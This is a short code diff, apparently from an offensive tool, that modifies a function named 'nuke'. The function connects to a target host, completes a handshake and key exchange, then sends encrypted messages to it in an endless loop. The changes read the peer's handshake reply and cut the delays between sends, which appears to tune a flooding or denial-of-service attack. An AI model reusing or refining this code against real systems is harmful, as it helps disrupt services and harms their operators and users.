@@ -86,8 +86,9 @@ def nuke(meh):
 #            s.setblocking(0)
             s.connect((target, TCP_PORT))
             s.send(generate_handshake())
+            remote_public = s.recv(1024) # Handshake
 
-            time.sleep(0.05)
+            time.sleep(0.01)
             s.send(generate_message_encryptionpubkey(public))
             time.sleep(0.2)
 
@@ -117,7 +118,7 @@ def nuke(meh):
 #            print("Enc sample:", aes.encrypt(b'abra_kadabra'))
 
             s.send(generate_message_start_encryption())
-            time.sleep(0.2)
+#            time.sleep(0.2)
             while True:
                 s.send(aes.encrypt(generate_message(b'\xaa', b'')))
                 time.sleep(0.5)
